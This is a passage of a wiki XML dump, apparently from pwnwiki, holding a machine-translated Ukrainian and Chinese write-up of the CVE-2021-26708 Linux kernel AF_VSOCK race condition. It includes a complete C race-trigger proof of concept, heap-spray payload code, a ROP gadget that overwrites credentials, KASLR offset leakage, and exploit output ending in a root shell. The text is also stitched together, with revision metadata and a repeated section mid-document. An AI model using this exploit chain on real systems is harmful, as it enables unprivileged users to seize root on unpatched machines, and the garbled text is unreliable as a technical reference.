Мережевий буфер в ядрі Linux представлений структурою sk_buff.У цьому об’єкті є skb_shared_info та destructor_arg, які можна використовувати для викрадення потоку управління. Дані мережі та skb_shared_info розміщуються в одному блоці пам'яті ядра, на який вказує sk_buff.head. Отже, створення 2800-байтового мережевого пакету в просторі користувача призведе до того, що skb_shared_info буде виділено в кеш-пам’ять kmalloc-4k, як і об’єкт mem_cgroup.

Я побудував такі кроки:

1. Використовуйте сокети (AF_INET, SOCK_DGRAM, IPPROTO_UDP), щоб створити клієнтський сокет і 32 серверні сокети

2. Підготуйте 2800-байтний буфер у просторі користувача та використовуйте 0x42 для memset ()

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
3.用sendto()將這個緩衝區從客戶端套接字發送到每個服務器套接字，用於在kmalloc-4k中創建sk_buff對象。在每個可用的CPU上使用`sched_setaffinity()
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
4.對vsock_sock執行任意讀取過程
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
5.計算可能的sk_buff內核地址為sk_memcg加4096(kmalloc-4k的下一個元素)
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
6.對這個可能的sk_buff地址執行任意讀
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
7.如果在網絡數據的位置找到0x42424242424242lu，則找到真正的sk_buff，進入步驟8。否則，在可能的sk_buff地址上加4096，轉到步驟6
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
8.sk_buff上執行32個pthreads的setxattr()&amp;userfaultfd()堆噴射，並把它們掛在pthread_barrier上
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
9.對sk_buff內核地址進行任意釋放
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
10.調用pthread_barrier_wait()，執行32個setxattr()覆蓋skb_shared_info的堆噴pthreads
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
11.使用recv()接收服務器套接字的網絡消息。
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
==通過skb_shared_info 進行任意寫==
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
以下是覆蓋sk_buff對象的有效payload：
&lt;/div&gt;

&lt;pre&gt;
#define SKB_SIZE        4096
#define SKB_SHINFO_OFFSET    3776
#define MY_UINFO_OFFSET        256
#define SKBTX_DEV_ZEROCOPY    (1 &lt;&lt; 3) 
void prepare_xattr_vs_skb_spray(void)
{
    struct skb_shared_info *info = NULL;

    xattr_addr = spray_data + PAGE_SIZE * 4 - SKB_SIZE + 4;

    /* Don't touch the second part to avoid breaking page fault delivery */
    memset(spray_data, 0x0, PAGE_SIZE * 4);

    info = (struct skb_shared_info *)(xattr_addr + SKB_SHINFO_OFFSET);
    info-&gt;tx_flags = SKBTX_DEV_ZEROCOPY;
    info-&gt;destructor_arg = uaf_write_value + MY_UINFO_OFFSET;

    uinfo_p = (struct ubuf_info *)(xattr_addr + MY_UINFO_OFFSET);
&lt;/pre&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
skb_shared_info駐留在噴射數據中，正好在偏移量SKB_SHINFO_OFFSET處，即3776字節。 skb_shared_info.destructor_arg指針存儲了struct ubuf_info的地址。因為被攻擊的sk_buff的內核地址是已知的，所以能在網絡緩衝區的MY_UINFO_OFFSET處創建了一個假的ubuf_info。下面是有效payload的佈局：
&lt;/div&gt;

[[File:T0185ccbf9f025c74da.png  | 600px]]

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
下面講講destructor_arg 回調:
&lt;/div&gt;
&lt;pre&gt;
 /*
     * A single ROP gadget for arbitrary write:
     *   mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rdx + rcx*8], rsi ; ret
     * Here rdi stores uinfo_p address, rcx is 0, rsi is 1
     */
    uinfo_p-&gt;callback = ARBITRARY_WRITE_GADGET + kaslr_offset;
    uinfo_p-&gt;desc = owner_cred + CRED_EUID_EGID_OFFSET; /* value for "qword ptr [rdi + 8]" */
    uinfo_p-&gt;desc = uinfo_p-&gt;desc - 1; /* rsi value 1 should not get into euid */
&lt;/pre&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
由於在vmlinuz-5.10.11-200.fc33.x86_64中找不到一個能滿足我需求的gadget，所以我自己進行了研究構造。
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
callback函數指針存儲一個ROP gadget 地址，RDI存儲callback函數的第一個參數，也就是ubuf_info本身的地址，RDI + 8指向ubuf_info.desc。 gadget 將ubuf_info.desc移動到RDX。現在RDX包含有效用戶ID和組ID的地址減一個字節。這個字節很重要：當gadget從 RSI向 RDX指向的內存中寫入消息1時，有效的 uid和 gid將被零覆蓋。重複同樣的過程，直到權限升級到root。整個過程輸出流如下：
&lt;/div&gt;
&lt;pre&gt;
[a13x@localhost ~]$ ./vsock_pwn

=================================================
==== CVE-2021-26708 PoC exploit by a13xp0p0v ====
=================================================

[+] begin as: uid=1000, euid=1000
[+] we have 2 CPUs for racing
[+] getting ready...
[+] remove old files for ftok()
[+] spray_data at 0x7f0d9111d000
[+] userfaultfd #1 is configured: start 0x7f0d91121000, len 0x1000
[+] fault_handler for uffd 38 is ready

[+] stage I: collect good msg_msg locations
[+] go racing, show wins: 
    save msg_msg ffff9125c25a4d00 in msq 11 in slot 0
    save msg_msg ffff9125c25a4640 in msq 12 in slot 1
    save msg_msg ffff9125c25a4780 in msq 22 in slot 2
    save msg_msg ffff9125c3668a40 in msq 78 in slot 3

[+] stage II: arbitrary free msg_msg using corrupted msg_msg
    kaddr for arb free: ffff9125c25a4d00
    kaddr for arb read: ffff9125c2035300
[+] adapt the msg_msg spraying payload:
    msg_ptr 0x7f0d91120fd8
    m_type 1337 at 0x7f0d91120fe8
    m_ts 6096 at 0x7f0d91120ff0
    msgseg next 0xffff9125c2035300 at 0x7f0d91120ff8
[+] go racing, show wins: 

[+] stage III: arbitrary read vsock via good overwritten msg_msg (msq 11)
[+] msgrcv returned 6096 bytes
[+] Found sk_memcg ffff9125c42f9000 (offset 4712 in the leaked kmem)
[+] Found owner cred ffff9125c3fd6e40 (offset 4888 in the leaked kmem)
[+] Found sock_def_write_space ffffffffab9851b0 (offset 4736 in the leaked kmem)
[+] Calculated kaslr offset: 2a000000

[+] stage IV: search sprayed skb near sk_memcg...
[+] checking possible skb location: ffff9125c42fa000
[+] stage IV part I: repeat arbitrary free msg_msg using corrupted msg_msg
    kaddr for arb free: ffff9125c25a4640
    kaddr for arb read: ffff9125c42fa030
[+] adapt the msg_msg spraying payload:
    msg_ptr 0x7f0d91120fd8
    m_type 1337 at 0x7f0d91120fe8
    m_ts 6096 at 0x7f0d91120ff0
    msgseg next 0xffff9125c42fa030 at 0x7f0d91120ff8
[+] go racing, show wins: 0 0 20 15 42 11 
[+] stage IV part II: arbitrary read skb via good overwritten msg_msg (msq 12)
[+] msgrcv returned 6096 bytes
[+] found a real skb

[+] stage V: try to do UAF on skb at ffff9125c42fa000
[+] skb payload:
    start at 0x7f0d91120004
    skb_shared_info at 0x7f0d91120ec4
    tx_flags 0x8
    destructor_arg 0xffff9125c42fa100
    callback 0xffffffffab64f6d4
    desc 0xffff9125c3fd6e53
[+] go racing, show wins: 15 

[+] stage VI: repeat UAF on skb at ffff9125c42fa000
[+] go racing, show wins: 0 12 13 15 3 12 4 16 17 18 9 47 5 12 13 9 13 19 9 10 13 15 12 13 15 17 30 

[+] finish as: uid=0, euid=0
[+] starting the root shell...
uid=0(root) gid=0(root) groups=0(root),1000(a13x) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
&lt;/pre&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
==視頻==
&lt;/div&gt;
&lt;youtube&gt;https://www.youtube.com/watch?v=EC8PFOYOUgU&lt;/youtube&gt;


&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
==參考==
&lt;/div&gt;
https://a13xp0p0v.github.io/2021/02/09/CVE-2021-26708.html</text>
      <sha1>sn7sjohcokndoackx31p8foxnm5mw84</sha1>
    </revision>
    <revision>
      <id>2613</id>
      <parentid>2597</parentid>
      <timestamp>2021-05-06T01:55:17Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "Якщо під час обробки msgsnd () відбувається пошкодження пам'яті msg_msg.security з потоку setsockopt (), перевірк..."</comment>
      <origin>2613</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="32971" sha1="8iukgwqw301m7nowgsmegdimed0kl81" xml:space="preserve">&lt;languages  /&gt;
== Уразливість ==

Ці вразливості - це умови перегонів, спричинені неправильним блокуванням у &lt;code&gt; net / vmw_vsock / af_vsock.c &lt;/code&gt;. Ці умовні змагання були неявно представлені у поданні, яке додало підтримку мультитранспорту VSOCK у листопаді 2019 року, та були об’єднані у версію ядра Linux 5.5-rc1.

&lt;code&gt; CONFIG_VSOCKETS &lt;/code&gt; та &lt;code&gt; CONFIG_VIRTIO_VSOCKETS &lt;/code&gt; надаються як модулі ядра у всіх основних дистрибутивах GNU / Linux. Коли ви створюєте сокет для домену AF_VSOCK, ці вразливі модулі завантажуються автоматично.
&lt;pre&gt;
vsock = socket(AF_VSOCK, SOCK_STREAM, 0);
&lt;/pre&gt;

Створення &lt;code&gt; AF_VSOCK &lt;/code&gt; сокетів доступне для непривілейованих користувачів і не вимагає простору імен користувачів.


== Пошкодження пам'яті ==

Далі наведено докладний вступ до використання CVE-2021-26708, використовуючи умовну конкуренцію в &lt;code&gt; vsock_stream_etssockopt () &lt;/code&gt;. Для відтворення потрібні два потоки. Перший потік викликає &lt;code&gt; setsockopt () &lt;/code&gt;:
&lt;pre&gt;
  setsockopt(vsock, PF_VSOCK, SO_VM_SOCKETS_BUFFER_SIZE,
                &amp;size, sizeof(unsigned long));
&lt;/pre&gt;



Другий потік змінює передачу віртуального сокета, коли &lt;code&gt; vsock_stream_etssockopt () &lt;/code&gt; намагається отримати блокування сокета, повторно підключивши віртуальний сокет:
&lt;pre&gt;
struct sockaddr_vm addr = {
        .svm_family = AF_VSOCK,
    };

    addr.svm_cid = VMADDR_CID_LOCAL;
    connect(vsock, (struct sockaddr *)&amp;addr, sizeof(struct sockaddr_vm));

    addr.svm_cid = VMADDR_CID_HYPERVISOR;
    connect(vsock, (struct sockaddr *)&amp;addr, sizeof(struct sockaddr_vm));
&lt;/pre&gt;


Для того, щоб обробити &lt;code&gt; connect () &lt;/code&gt; віртуального сокета, ядро ​​виконує &lt;code&gt; vsock_stream_connect () &lt;/code&gt;, що викликає &lt;code&gt; vsock_assign_transport () &lt;/code&gt;. Ця функція містить такий код:
&lt;pre&gt;
     if (vsk-&gt;transport) {
            if (vsk-&gt;transport == new_transport)
                return 0;

            /* transport-&gt;release() must be called with sock lock acquired.
             * This path can only be taken during vsock_stream_connect(),
             * where we have already held the sock lock.
             * In the other cases, this function is called on a new socket
             * which is not assigned to any transport.
             */
            vsk-&gt;transport-&gt;release(vsk);
            vsock_deassign_transport(vsk);
        }
&lt;/pre&gt;

&lt;code&gt; vsock_stream_connect () &lt;/code&gt; містить блокування сокета, а &lt;code&gt; vsock_stream_setsockopt () &lt;/code&gt; у паралельному потоці також намагається отримати його, що становить умовну конкуренцію. Отже, коли другий &lt;code&gt; connect () &lt;/code&gt; виконується з іншим &lt;code&gt; svm_cid &lt;/code&gt;, викликається функція &lt;code&gt; vsock_de assign_transport () &lt;/code&gt;. Ця функція виконує &lt;code&gt; virtio_transport_destruct () &lt;/code&gt;, випускає &lt;code&gt; vsock_sock.trans &lt;/code&gt;, а для &lt;code&gt; vsk-&gt; transport &lt;/code&gt; встановлено значення NULL. Коли &lt;code&gt; vsock_stream_connect () &lt;/code&gt; звільняє блокування сокета, &lt;code&gt; vsock_stream_setsockopt () &lt;/code&gt; може продовжувати виконуватися. Він викликає &lt;code&gt; vsock_update_buffer_size () &lt;/code&gt;, а потім викликає &lt;code&gt; transport-&gt; notify_buffer_size () &lt;/code&gt;. Тут транспорт містить застаріле значення з локальної змінної, яке не відповідає &lt;code&gt; vsk-&gt; транспорт &lt;/code&gt; (вихідне значення має значення NULL).

Коли ядро ​​виконує &lt;code&gt; virtio_transport_notify_buffer_size () &lt;/code&gt;, відбувається пошкодження пам'яті:
&lt;pre&gt;
void virtio_transport_notify_buffer_size(struct vsock_sock *vsk, u64 *val)
{
    struct virtio_vsock_sock *vvs = vsk-&gt;trans;

    if (*val &gt; VIRTIO_VSOCK_MAX_BUF_SIZE)
        *val = VIRTIO_VSOCK_MAX_BUF_SIZE;

    vvs-&gt;buf_alloc = *val;

    virtio_transport_send_credit_update(vsk, VIRTIO_VSOCK_TYPE_STREAM, NULL);
}
&lt;/pre&gt;

Тут vvs - це вказівник на пам’ять ядра, який був випущений у &lt;code&gt; virtio_transport_destruct () &lt;/code&gt;. Розмір &lt;code&gt; struct virtio_vsock_sock &lt;/code&gt; дорівнює 64 байтам і знаходиться в кеш-пам’яті kmalloc-64. Тип поля buf_alloc має значення u32 і знаходиться зі зміщенням 40. &lt;code&gt; VIRTIO_VSOCK_MAX_BUF_SIZE - 0xFFFFFFFFUL &lt;/code&gt;. Значення * val контролюється зловмисником, а його чотири найменш важливі байти записуються у звільнену пам'ять.


== Розмивання ==

Fuzzer syzkaller не має можливості відтворити цю аварію, тому я вирішив вивчити її сам. Але чому фуззер виходить з ладу? Дотримуйтесь &lt;code&gt; vsock_update_buffer_size () &lt;/code&gt; і дізнайтеся:
&lt;pre&gt;
 if (val != vsk-&gt;buffer_size &amp;&amp;
      transport &amp;&amp; transport-&gt;notify_buffer_size)
        transport-&gt;notify_buffer_size(vsk, &amp;val);

    vsk-&gt;buffer_size = val;

&lt;/pre&gt;

Тільки тоді, коли val відрізняється від поточного buffer_size, буде викликатися &lt;code&gt; notify_buffer_size () &lt;/code&gt;, тобто, коли &lt;code&gt; setsockopt () &lt;/code&gt; виконує &lt;code&gt; SO_VM_SOCKETS_BUFFER_SIZE &lt;/code&gt;, кожного разу Параметри розміру дзвінка повинні бути різними. Тож я створив відповідний код:
&lt;pre&gt;
/*
 * AF_VSOCK vulnerability trigger.
 * It's a PoC just for fun.
 * Author: Alexander Popov &lt;alex.popov@linux.com&gt;.
 */

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;pthread.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;linux/vm_sockets.h&gt;
#include &lt;unistd.h&gt;

#define err_exit(msg) do { perror(msg); exit(EXIT_FAILURE); } while (0)

#define MAX_RACE_LAG_USEC 50

int vsock = -1;
int tfail = 0;
pthread_barrier_t barrier;

int thread_sync(long lag_nsec)
{
	int ret = -1;
	struct timespec ts0;
	struct timespec ts;
	long delta_nsec = 0;

	ret = pthread_barrier_wait(&amp;barrier);
	if (ret != 0 &amp;&amp; ret != PTHREAD_BARRIER_SERIAL_THREAD) {
		perror("[-] pthread_barrier_wait");
		return EXIT_FAILURE;
	}

	ret = clock_gettime(CLOCK_MONOTONIC, &amp;ts0);
	if (ret != 0) {
		perror("[-] clock_gettime");
		return EXIT_FAILURE;
	}

	while (delta_nsec &lt; lag_nsec) {
		ret = clock_gettime(CLOCK_MONOTONIC, &amp;ts);
		if (ret != 0) {
			perror("[-] clock_gettime");
			return EXIT_FAILURE;
		}

		delta_nsec = (ts.tv_sec - ts0.tv_sec) * 1000000000 +
						ts.tv_nsec - ts0.tv_nsec;
	}

	return EXIT_SUCCESS;
}

void *th_connect(void *arg)
{
	int ret = -1;
	long lag_nsec = *((long *)arg) * 1000;
	struct sockaddr_vm addr = {
		.svm_family = AF_VSOCK,
	};

	ret = thread_sync(lag_nsec);
	if (ret != EXIT_SUCCESS) {
		tfail++;
		return NULL;
	}

	addr.svm_cid = VMADDR_CID_LOCAL;
	connect(vsock, (struct sockaddr *)&amp;addr, sizeof(struct sockaddr_vm));

	addr.svm_cid = VMADDR_CID_HYPERVISOR;
	connect(vsock, (struct sockaddr *)&amp;addr, sizeof(struct sockaddr_vm));

	return NULL;
}

void *th_setsockopt(void *arg)
{
	int ret = -1;
	long lag_nsec = *((long *)arg) * 1000;
	struct timespec tp;
	unsigned long size = 0;

	ret = thread_sync(lag_nsec);
	if (ret != EXIT_SUCCESS) {
		tfail++;
		return NULL;
	}

	clock_gettime(CLOCK_MONOTONIC, &amp;tp);
	size = tp.tv_nsec;
	setsockopt(vsock, PF_VSOCK, SO_VM_SOCKETS_BUFFER_SIZE,
						&amp;size, sizeof(unsigned long));

	return NULL;
}

int main(void)
{
	int ret = -1;
	unsigned long size = 0;
	long loop = 0;
	pthread_t th[2] = { 0 };

	vsock = socket(AF_VSOCK, SOCK_STREAM, 0);
	if (vsock == -1)
		err_exit("[-] open vsock");

	printf("[+] AF_VSOCK socket is opened\n");

	size = 1;
	setsockopt(vsock, PF_VSOCK, SO_VM_SOCKETS_BUFFER_MIN_SIZE,
						&amp;size, sizeof(unsigned long));
	size = 0xfffffffffffffffdlu;
	setsockopt(vsock, PF_VSOCK, SO_VM_SOCKETS_BUFFER_MAX_SIZE,
						&amp;size, sizeof(unsigned long));

	ret = pthread_barrier_init(&amp;barrier, NULL, 2);
	if (ret != 0)
		err_exit("[-] pthread_barrier_init");

	for (loop = 0; loop &lt; 30000; loop++) {
		long tmo1 = 0;
		long tmo2 = loop % MAX_RACE_LAG_USEC;

		printf("race loop %ld: tmo1 %ld, tmo2 %ld\n", loop, tmo1, tmo2);

		ret = pthread_create(&amp;th[0], NULL, th_connect, &amp;tmo1);
		if (ret != 0)
			err_exit("[-] pthread_create #0");

		ret = pthread_create(&amp;th[1], NULL, th_setsockopt, &amp;tmo2);
		if (ret != 0)
			err_exit("[-] pthread_create #1");

		ret = pthread_join(th[0], NULL);
		if (ret != 0)
			err_exit("[-] pthread_join #0");

		ret = pthread_join(th[1], NULL);
		if (ret != 0)
			err_exit("[-] pthread_join #1");

		if (tfail) {
			printf("[-] some thread got troubles\n");
			exit(EXIT_FAILURE);
		}
	}

	ret = close(vsock);
	if (ret)
		perror("[-] close");

	printf("[+] now see your warnings in the kernel log\n");
	return 0;
}
&lt;/pre&gt;

Значення розміру тут береться з кількості наносекунд, повернутих &lt;code&gt; clock_gettime () &lt;/code&gt;, яка може різнитися кожного разу. Оригінальний syzkaller цього не робить, оскільки коли syzkaller генерує нечіткий вхід, значення параметра syscall визначається і не буде змінюватися під час виконання.

== Ступінь чотирьох байт ==

Тут я вибираю сервер Fedora 33 як ціль дослідження, версія ядра - 5.10.11-200.fc33.x86_64, і я твердо вирішив обійти SMEP та SMAP.

На першому кроці я почав вивчати стабільне розпилення купи, яке використовувало виконання просторових дій користувача, щоб змусити ядро ​​виділити ще один 64-байтовий об'єкт у розташуванні звільненого virtio_vsock_sock. Після кількох експериментальних спроб було підтверджено, що випущений virtio_vsock_sock був перезаписаний, вказуючи на те, що обприскування купи можливо. Нарешті я знайшов msgsnd () syscall. Він створює struct msg_msg у просторі ядра, див. Вивід pahole:
&lt;pre&gt;
struct msg_msg {
    struct list_head           m_list;               /*     0    16 */
    long int                   m_type;               /*    16     8 */
    size_t                     m_ts;                 /*    24     8 */
    struct msg_msgseg *        next;                 /*    32     8 */
    void *                     security;             /*    40     8 */

    /* size: 48, cachelines: 1, members: 5 */
    /* last cacheline: 48 bytes */
};
&lt;/pre&gt;

Спереду - заголовок повідомлення, а ззаду - дані повідомлення. Якщо структура msgbuf у користувацькому просторі має 16-байтовий mtext, відповідний msg_msg буде створений у кеш-пам'яті kmalloc-64. 4-байтовий беззаписний запис зруйнує покажчик безпеки void * зі зміщенням 40. Поле msg_msg.security вказує на дані ядра, виділені lsm_msg_msg_alloc (). Коли msg_msg отримано, воно буде звільнене за допомогою security_msg_msg_free (). Отже, знищивши першу половину покажчика безпеки, можна отримати довільний безкоштовний.

== Витік інформації про ядро ​​==

Тут використовується [https://www.pwnwiki.org/index.php?title=CVE-2019-18683_Linux_kernel_through_5.3.8_%E7%89%B9%E6%AC%8A%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E CVE-2019-18683] та ж техніка. Друге з'єднання () віртуального сокета викликає &lt;code&gt; vsock_de assign_transport () &lt;/code&gt; і встановлює &lt;code&gt; vsk-&gt; transport &lt;/code&gt; на NULL, роблячи &lt;code&gt; vsock_stream_setsockopt () &lt;/code&gt; Виклик &lt;code &gt; virtio_transport_send_pkt_info () &lt;/code&gt; після збою пам'яті з'являється попередження ядра:
&lt;pre&gt;
WARNING: CPU: 1 PID: 6739 at net/vmw_vsock/virtio_transport_common.c:34
...
CPU: 1 PID: 6739 Comm: racer Tainted: G        W         5.10.11-200.fc33.x86_64 #1
Hardware name: QEMU Standard PC (Q35 + ICH9, 2009), BIOS 1.13.0-2.fc32 04/01/2014
RIP: 0010:virtio_transport_send_pkt_info+0x14d/0x180 [vmw_vsock_virtio_transport_common]
...
RSP: 0018:ffffc90000d07e10 EFLAGS: 00010246
RAX: 0000000000000000 RBX: ffff888103416ac0 RCX: ffff88811e845b80
RDX: 00000000ffffffff RSI: ffffc90000d07e58 RDI: ffff888103416ac0
RBP: 0000000000000000 R08: 00000000052008af R09: 0000000000000000
R10: 0000000000000126 R11: 0000000000000000 R12: 0000000000000008
R13: ffffc90000d07e58 R14: 0000000000000000 R15: ffff888103416ac0
FS:  00007f2f123d5640(0000) GS:ffff88817bd00000(0000) knlGS:0000000000000000
CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
CR2: 00007f81ffc2a000 CR3: 000000011db96004 CR4: 0000000000370ee0
Call Trace:
  virtio_transport_notify_buffer_size+0x60/0x70 [vmw_vsock_virtio_transport_common]
  vsock_update_buffer_size+0x5f/0x70 [vsock]
  vsock_stream_setsockopt+0x128/0x270 [vsock]
...
&lt;/pre&gt;
За допомогою налагодження gdb виявляється, що регістр RCX містить адресу ядра звільненої virtio_vsock_sock, а регістр RBX - адресу ядра vsock_sock.

== Досягнення довільного читання ==

===From arbitrary free to use-after-free===

Звільніть об’єкт з адреси ядра, що просочилася
Виконайте розпилення купи та накрийте об’єкт контрольованими даними
Використовуйте пошкоджені об’єкти для ескалації привілеїв
Повідомлення System V, реалізоване ядром, має максимальний ліміт DATALEN_MSG, тобто PAGE_SIZE мінус sizeof (struct msg_msg)). Якщо ви надсилаєте повідомлення більшого розміру, решта повідомлень зберігаються у списку сегментів повідомлень. Msg_msg містить структуру msg_msgseg * поруч із вказівкою на перший сегмент, а size_t m_ts використовується для зберігання розміру. При виконанні операції перезапису ви можете помістити контрольоване значення в msg_msg.m_ts та msg_msg.next:

[[File:T01a51dfe7a996e854c.png | 600px ]]


Payload:
&lt;pre&gt;
    #define PAYLOAD_SZ 40 
    void adapt_xattr_vs_sysv_msg_spray(unsigned long kaddr)
    {
        struct msg_msg *msg_ptr;

        xattr_addr = spray_data + PAGE_SIZE * 4 - PAYLOAD_SZ;

        /* Don't touch the second part to avoid breaking page fault delivery */
        memset(spray_data, 0xa5, PAGE_SIZE * 4);

        printf("[+] adapt the msg_msg spraying payload:\n");
        msg_ptr = (struct msg_msg *)xattr_addr;
        msg_ptr-&gt;m_type = 0x1337;
        msg_ptr-&gt;m_ts = ARB_READ_SZ;
        msg_ptr-&gt;next = (struct msg_msgseg *)kaddr; /* set the segment ptr for arbitrary read */
        printf("\tmsg_ptr %p\n\tm_type %lx at %p\n\tm_ts %zu at %p\n\tmsgseg next %p at %p\n",
               msg_ptr,
               msg_ptr-&gt;m_type, &amp;(msg_ptr-&gt;m_type),
               msg_ptr-&gt;m_ts, &amp;(msg_ptr-&gt;m_ts),
               msg_ptr-&gt;next, &amp;(msg_ptr-&gt;next));
    }
&lt;/pre&gt;
Але як використовувати msg_msg для читання даних ядра? Читаючи документацію щодо системного виклику msgrcv (), я знайшов хороше рішення, використовуючи прапори msgrcv () та MSG:
&lt;pre&gt;
MSG_COPY (since Linux 3.8)
        Nondestructively fetch a copy of the message at the ordinal position  in  the  queue
        specified by msgtyp (messages are considered to be numbered starting at 0).
&lt;/pre&gt;
Цей прапор змушує ядро ​​копіювати дані повідомлень у користувацький простір, не видаляючи їх із черги повідомлень. Якщо ядро ​​має CONFIG_CHECKPOINT_RESTORE = y, то MSG доступний і застосовується на сервері Fedora.

=== Етапи довільного читання ===

Готовий до роботи:
Використовуйте sched_getaffinity () та CPU_COUNT () для обчислення кількості доступних процесорів (для цієї вразливості потрібно щонайменше два);
Відкрити /dev/kmsg для аналізу;
mmap () налаштовує userfaultfd () в області пам'яті spray_data як останню частину;
Запустіть окремий pthread для обробки подій userfaultfd ();
Запустіть 127 потоків для розпилювача кучі setxattr () &amp; userfaultfd () на msg_msg і повісьте їх на thread_barrier;
Отримайте адресу ядра оригінального msg_msg:
Умовна конкуренція на віртуальних сокетах;
Після другого з'єднання (), зачекайте 35 мікросекунд у зайнятому циклі;
Зателефонуйте msgsnd (), щоб створити окрему чергу повідомлень; після пошкодження пам’яті об’єкт msg_msg поміщається в положення virtio_vsock_sock;
Проаналізуйте журнал ядра та збережіть адресу ядра msg_msg із попередження ядра (регістр RCX);
Одночасно збережіть адресу ядра vsock_sock з реєстру RBX;
Використовуйте пошкоджений msg_msg, щоб виконати довільний випуск оригінального msg_msg:
Використовуйте 4 байти вихідної адреси msg_msg як SO_VM_SOCKETS_BUFFER_SIZE для досягнення пошкодження пам’яті;
Умовна конкуренція на віртуальних сокетах;
Зателефонуйте msgsnd () відразу після другого з'єднання (); msg_msg розміщується в положенні virtio_vsock_sock для досягнення знищення;
Покажчик безпеки тепер знищеного msg_msg зберігає адресу оригінального msg_msg (з кроку 2);

[[File:T01a2a2d47c9494c4a5.png | 600px ]]

Якщо під час обробки msgsnd () відбувається пошкодження пам'яті msg_msg.security з потоку setsockopt (), перевірка дозволів SELinux не вдається;
У цьому випадку msgsnd () повертає -1, а пошкоджений msg_msg знищується; випуск msg_msg.security може звільнити оригінальний msg_msg;
Перезапишіть вихідний msg_msg контрольованим корисним навантаженням:
Після того, як msgsnd () вийде з ладу, вразливість викличе pthread_barrier_wait () і викличе 127 pthreads для розпилення купи;
Ці pthreads виконують корисне навантаження setxattr ();
Початковий msg_msg замінюється керованими даними, а покажчик msg_msg.next зберігає адресу об'єкта vsock_sock;

[[File:T0140baae964febb059.png | 600px ]]

Прочитайте вміст об’єкта ядра vsock_sock до простору користувача, отримавши повідомлення з черги повідомлень, в якому зберігається перезаписаний msg_msg:
&lt;pre&gt;
ret = msgrcv(msg_locations[0].msq_id, kmem, ARB_READ_SZ, 0,
                IPC_NOWAIT | MSG_COPY | MSG_NOERROR);
&lt;/pre&gt;

== Знайдіть ціль атаки ==

Ось пункти, які я знайшов:
1. Виділений кеш блоку, такий як PINGv6 та sock_inode_cache, має багато покажчиків на об'єкти
2. Покажчик struct mem_cgroup * sk_memcg має зміщення 664 у vsock_sock.sk. Структура mem_cgroup виділена в кеш-пам’яті kmalloc-4k.
3. Вказівник власника const struct cred * знаходиться на відстані 840 від vsock_sock.sk і зберігає адресу облікових даних, які можна перезаписати для ескалації дозволів.
4. Покажчик функції void (* sk_write_space) (struct sock *) знаходиться на відстані 688 від vsock_sock.sk і встановлюється на адресу функції ядра sock_def_write_space (). Він може бути використаний для розрахунку зміщення KASLR.

Ось як уразливість витягує ці вказівники з пам'яті:

&lt;pre&gt;
#define SK_MEMCG_RD_LOCATION    (DATALEN_MSG + SK_MEMCG_OFFSET)
#define OWNER_CRED_OFFSET    840
#define OWNER_CRED_RD_LOCATION    (DATALEN_MSG + OWNER_CRED_OFFSET)
#define SK_WRITE_SPACE_OFFSET    688
#define SK_WRITE_SPACE_RD_LOCATION (DATALEN_MSG + SK_WRITE_SPACE_OFFSET) 
/*
 * From Linux kernel 5.10.11-200.fc33.x86_64:
 *   function pointer for calculating KASLR secret
 */
#define SOCK_DEF_WRITE_SPACE    0xffffffff819851b0lu 
unsigned long sk_memcg = 0;
unsigned long owner_cred = 0;
unsigned long sock_def_write_space = 0;
unsigned long kaslr_offset = 0;

/* ... */

    sk_memcg = kmem[SK_MEMCG_RD_LOCATION / sizeof(uint64_t)];
    printf("[+] Found sk_memcg %lx (offset %ld in the leaked kmem)\n",
            sk_memcg, SK_MEMCG_RD_LOCATION);

    owner_cred = kmem[OWNER_CRED_RD_LOCATION / sizeof(uint64_t)];
    printf("[+] Found owner cred %lx (offset %ld in the leaked kmem)\n",
            owner_cred, OWNER_CRED_RD_LOCATION);

    sock_def_write_space = kmem[SK_WRITE_SPACE_RD_LOCATION / sizeof(uint64_t)];
    printf("[+] Found sock_def_write_space %lx (offset %ld in the leaked kmem)\n",
            sock_def_write_space, SK_WRITE_SPACE_RD_LOCATION);

    kaslr_offset = sock_def_write_space - SOCK_DEF_WRITE_SPACE;
    printf("[+] Calculated kaslr offset: %lx\n", kaslr_offset);
&lt;/pre&gt;

== Впровадити Use-after-free на sk_buff ==

Мережевий буфер в ядрі Linux представлений структурою sk_buff.У цьому об’єкті є skb_shared_info та destructor_arg, які можна використовувати для викрадення потоку управління. Дані мережі та skb_shared_info розміщуються в одному блоці пам'яті ядра, на який вказує sk_buff.head. Отже, створення 2800-байтового мережевого пакету в просторі користувача призведе до того, що skb_shared_info буде виділено в кеш-пам’ять kmalloc-4k, як і об’єкт mem_cgroup.

Я побудував такі кроки:

1. Використовуйте сокети (AF_INET, SOCK_DGRAM, IPPROTO_UDP), щоб створити клієнтський сокет і 32 серверні сокети

